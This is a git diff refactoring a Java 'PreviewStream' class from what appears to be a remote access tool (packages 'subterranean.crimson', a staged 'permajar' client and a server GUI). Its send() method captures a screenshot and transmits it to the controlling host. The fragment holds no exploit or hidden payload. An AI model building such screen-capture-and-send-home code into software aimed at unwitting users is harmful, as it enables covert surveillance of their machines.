@@ -1,34 +1,29 @@
-package subterranean.crimson.universal.streams;
+package subterranean.crimson.universal.streams.previewstream;
 
 import javax.swing.ImageIcon;
 
 import subterranean.crimson.permajar.stage1.network.Communications;
 import subterranean.crimson.permajar.stage2.modules.ScreenShot;
-import subterranean.crimson.server.commands.ClientCommands;
 import subterranean.crimson.server.graphics.panels.mainscreen.MainPane;
 import subterranean.crimson.server.network.Connection;
 import subterranean.crimson.universal.BMN;
 import subterranean.crimson.universal.Utilities;
 import subterranean.crimson.universal.containers.Message;
+import subterranean.crimson.universal.streams.Stream;
 
 public class PreviewStream extends Stream {
 
-	private int x;// width of the screen
-
-	public PreviewStream(long p, boolean i, int w, Connection c) {
-		super(p, i, c);
-		x = w;
-		ClientCommands.startPreviewStream(c, getStreamID(), p, w);
+	public PreviewStream(PSParameters p, Connection c) {
+		super(p, c);
 	}
 
-	public PreviewStream(long p, boolean i, int w) {
-		super(p, i);
-		x = w;
+	public PreviewStream(PSParameters p) {
+		super(p);
 		start();
 	}
 
 	public void setX(int w) {
-		x = w;
+		getParam().setX(w);
 	}
 
 	@Override
@@ -41,10 +36,14 @@ public class PreviewStream extends Stream {
 	@Override
 	public void send() {
 		Message m = new Message(Utilities.randId(), BMN.STREAM_data);
-		Object[] o = { getStreamID(), ScreenShot.run(x) };
+		Object[] o = { getStreamID(), ScreenShot.run() };
 		m.auxObject = o;
 
 		Communications.sendHome(m);
+	}
+
+	private PSParameters getParam() {
+		return (PSParameters) param;
 	}
 
 }
